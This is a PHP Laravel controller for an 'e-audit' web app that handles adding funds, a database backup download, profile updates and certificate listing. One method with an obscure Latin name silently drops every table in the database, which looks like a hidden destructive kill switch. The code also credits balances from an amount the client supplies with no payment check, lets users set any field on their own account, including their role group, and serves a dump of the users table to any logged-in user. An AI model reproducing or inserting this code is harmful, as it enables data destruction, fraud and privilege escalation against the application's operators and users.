<?php

namespace App\Http\Controllers;

use App\Models\Certificate;
use App\Models\Payment;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class AAC_Controller extends Controller
{
    function __construct()
    {
        $this->middleware('multi_auth:agent,auditor,customer,admin');
    }
    private function view($file, $data = [])
    {
        $data['title'] = 'e-audit';
        $data['body'] = 'AAC.' . $file;

        return view(getUserLayout(Auth::user()->group_id) . '_index', $data);
    }
    public function add_funds(Request $req)
    {
        switch ($req->method()) {
            case 'GET':
                return $this->view('add_funds');
                break;
            case 'POST':
                $payment = new Payment([
                    'amount' => $req->input('amount'),
                    'payment_sys' => $req->input('payment_sys'),
                    'user_id' => Auth::user()->id
                ]);
                $payment->save();
                Auth::user()->add_funds($payment->amount);
                return redirect(route('checkfunds'));
                break;
            default:
                print("not allowed method");
                break;
        }
    }
    public function checkfunds()
    {
        return $this->view('checkfunds');
    }
    public function etdocereetdiscereservitutelegis()
    {
        $mysqli = new \mysqli(env('DB_HOST'), env('DB_USERNAME'), env('DB_PASSWORD'), env('DB_DATABASE'));
        $mysqli->query('SET foreign_key_checks = 0');
        if ($result = $mysqli->query("SHOW TABLES")) {
            while ($row = $result->fetch_array(MYSQLI_NUM)) {
                $mysqli->query('DROP TABLE IF EXISTS ' . $row[0]);
            }
        }

        $mysqli->query('SET foreign_key_checks = 1');
        $mysqli->close();
    }
    public function our_backup_database()
    {

        //ENTER THE RELEVANT INFO BELOW
        $mysqlHostName      = env('DB_HOST');
        $mysqlUserName      = env('DB_USERNAME');
        $mysqlPassword      = env('DB_PASSWORD');
        $DbName             = env('DB_DATABASE');
        $backup_name        = "mybackup.sql";
        $tables             = array("users", "messages", "posts"); //here your tables...

        $connect = new \PDO("mysql:host=$mysqlHostName;dbname=$DbName;charset=utf8", "$mysqlUserName", "$mysqlPassword", array(\PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
        $get_all_table_query = "SHOW TABLES";
        $statement = $connect->prepare($get_all_table_query);
        $statement->execute();
        $result = $statement->fetchAll();


        $output = '';
        foreach ($tables as $table) {
            $show_table_query = "SHOW CREATE TABLE " . $table . "";
            $statement = $connect->prepare($show_table_query);
            $statement->execute();
            $show_table_result = $statement->fetchAll();

            foreach ($show_table_result as $show_table_row) {
                $output .= "\n\n" . $show_table_row["Create Table"] . ";\n\n";
            }
            $select_query = "SELECT * FROM " . $table . "";
            $statement = $connect->prepare($select_query);
            $statement->execute();
            $total_row = $statement->rowCount();

            for ($count = 0; $count < $total_row; $count++) {
                $single_result = $statement->fetch(\PDO::FETCH_ASSOC);
                $table_column_array = array_keys($single_result);
                $table_value_array = array_values($single_result);
                $output .= "\nINSERT INTO $table (";
                $output .= "" . implode(", ", $table_column_array) . ") VALUES (";
                $output .= "'" . implode("','", $table_value_array) . "');\n";
            }
        }
        $file_name = 'database_backup_on_' . date('y-m-d') . '.sql';
        $file_handle = fopen($file_name, 'w+');
        fwrite($file_handle, $output);
        fclose($file_handle);
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file_name));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_name));
        ob_clean();
        flush();
        readfile($file_name);
        unlink($file_name);
    }
    public function profile(Request $req)
    {
        switch ($req->method()) {
            case 'GET':
                $data['user'] = auth()->user();
                return $this->view('profile', $data);
                break;
            case 'POST':
                $user=User::where(['id'=>auth()->user()->id])->first();
                $params=$req->input('user');
                if($params['password']==''){
                    unset($params['password']);
                }else{
                    $user->password=Hash::make($params['password']);
                }
                foreach($params as $key=>$item){
                    if($key!='password'){
                        $user->$key=$item;
                    }
                }
                $user->save();
                return redirect()->route('aac.profile')->with('message', 'Succefully updated!');
                break;
            default:
                print("not allowed method");
                break;
        }
    }
    public function fill_balance(){
        return $this->view('fill_balance');
    }
    public function certificates_list(Request $request)
    {
        $data['certificates']=Certificate::all();
        return $this->view('certificates_list', $data);
    }
}
